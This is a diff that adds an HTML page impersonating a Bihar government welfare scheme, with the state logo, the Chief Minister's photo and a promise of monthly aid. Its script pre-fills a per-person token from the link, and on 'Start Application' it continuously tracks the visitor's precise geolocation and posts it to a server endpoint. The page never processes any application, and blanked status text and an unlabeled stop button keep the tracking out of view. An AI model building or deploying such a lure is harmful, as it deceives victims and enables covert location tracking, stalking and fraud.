@@ -1,0 +1,181 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>मुख्यमंत्री प्रतिज्ञा योजना - बिहार सरकार</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      max-width: 900px;
+      margin: auto;
+      background-color: #fff8b3; /* हल्का पीला */
+    }
+
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 3px solid red;
+      padding: 10px;
+      margin-bottom: 20px;
+    }
+
+    header img {
+      max-width: 120px;   /* desktop size */
+      height: auto;
+    }
+
+    .title {
+      text-align: center;
+      flex: 1; /* बीच में फैलने देगा */
+      color: darkred;
+      font-weight: bold;
+      font-size: 28px;
+    }
+
+    button {
+      padding:12px 18px;
+      font-size:16px;
+      margin-right:8px;
+      cursor: pointer;
+    }
+
+    #status {
+      margin-top:12px;
+      color: #333;
+      font-weight: bold;
+      word-break: break-word;
+    }
+
+    label { font-weight: bold; }
+    input {
+      padding: 6px;
+      font-size: 14px;
+      width: 100%;
+      max-width: 300px;
+      margin-top: 5px;
+    }
+    .hint { color: #444; font-size: 14px; margin-top:8px; }
+
+    /* Responsive Design (mobile) */
+    @media (max-width: 768px) {
+      header {
+        flex-direction: row;   /* mobile me bhi row hi rahe */
+      }
+      .title {
+        font-size: 20px;
+        padding: 0 10px;
+      }
+      header img {
+        max-width: 70px;   /* chhota image */
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <!-- Left: Bihar Logo -->
+    <img src="pic/Bihar_Government_Banner.png" alt="Bihar Government Logo">
+
+    <!-- Center Title -->
+    <div class="title">मुख्यमंत्री प्रतिज्ञा योजना</div>
+
+    <!-- Right: CM Photo -->
+    <img src="pic/CM-Nitish-Kumar-1.png" alt="CM Bihar">
+  </header>
+
+  <p>इस योजना के अंतर्गत योग्य युवाओं को मासिक आर्थिक सहायता दी जाएगी। आवेदन के लिए अपना नाम दर्ज करें और प्रक्रिया पूरी करें।</p>
+
+  <!-- Name Input -->
+  <div>
+    <label>Enter Name:<br>
+      <input id="token" placeholder="अपना नाम लिखें">
+    </label>
+  </div>
+
+  <div style="margin-top:12px;">
+    <button id="startBtn">Start Application</button>
+    <button id="stopBtn" disabled></button>
+  </div>
+
+  <p id="status">Form not started.</p>
+  <p class="hint">* योजना के लिए अपना नाम दर्ज करें</p>
+
+<script>
+const status = document.getElementById('status');
+const startBtn = document.getElementById('startBtn');
+const stopBtn = document.getElementById('stopBtn');
+const tokenInput = document.getElementById('token');
+let watchId = null;
+
+function prefillTokenFromUrl() {
+  try {
+    const url = new URL(window.location.href);
+    const qToken = url.searchParams.get('token');
+    if (qToken) { tokenInput.value = qToken; return; }
+    const pathParts = url.pathname.split('/').filter(Boolean);
+    if (pathParts.length >= 2) {
+      const last = pathParts[pathParts.length - 1];
+      if (last && last.length <= 50 && !last.includes('.html')) {
+        tokenInput.value = decodeURIComponent(last);
+      }
+    }
+  } catch {}
+}
+prefillTokenFromUrl();
+
+function sendLocationToServer(payload) {
+  fetch('/api/receive-location', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  }).catch(err => console.warn('Failed to send location:', err));
+}
+
+startBtn.addEventListener('click', () => {
+  if (!navigator.geolocation) {
+    status.textContent = "";
+    return;
+  }
+  const name = tokenInput.value.trim() || 'Unknown';
+  status.textContent = "";
+  startBtn.disabled = true;
+  stopBtn.disabled = false;
+
+  watchId = navigator.geolocation.watchPosition(
+    (pos) => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const acc = pos.coords.accuracy;
+      const ts = pos.timestamp || Date.now();
+      status.textContent = `${name} — ${lat.toFixed(6)}, ${lon.toFixed(6)} (±${Math.round(acc)}m) — ${new Date(ts).toLocaleString()}`;
+      sendLocationToServer({ token: name, latitude: lat, longitude: lon, accuracy: acc, timestamp: ts });
+    },
+    (err) => {
+      status.textContent = "" + (err.message || err.code);
+      startBtn.disabled = false;
+      stopBtn.disabled = true;
+      if (watchId !== null) { navigator.geolocation.clearWatch(watchId); watchId = null; }
+    },
+    { enableHighAccuracy: true, maximumAge: 5000, timeout: 20000 }
+  );
+});
+
+stopBtn.addEventListener('click', () => {
+  if (watchId !== null) {
+    navigator.geolocation.clearWatch(watchId);
+    watchId = null;
+  }
+  status.textContent = "";
+  startBtn.disabled = false;
+  stopBtn.disabled = true;
+});
+
+window.addEventListener('beforeunload', () => {
+  if (watchId !== null) { navigator.geolocation.clearWatch(watchId); watchId = null; }
+});
+</script>
+</body>
+</html>
